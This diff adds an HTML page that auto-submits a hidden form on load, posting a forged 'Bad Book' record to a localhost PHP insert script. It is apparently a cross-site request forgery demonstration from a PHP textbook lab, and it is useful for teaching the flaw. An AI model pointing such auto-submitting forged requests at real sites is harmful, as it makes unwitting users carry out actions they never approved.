@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>auto_submit.html</title>
+</head>
+<body onload="document.fm.submit();">
+    <form name="fm" method="post" action="http://localhost/selfphp/chap09/insert_process.php">
+        <input type="hidden" name="isbn" value="978-X-7X80-2401-X" />
+        <input type="hidden" name="title" value="Bad Book" />
+        <input type="hidden" name="price" value="9999" />
+        <input type="hidden" name="publish" value="Bad Publish" />
+        <input type="hidden" name="published" value="2016-12-31" />
+    </form>
+</body>
+</html>
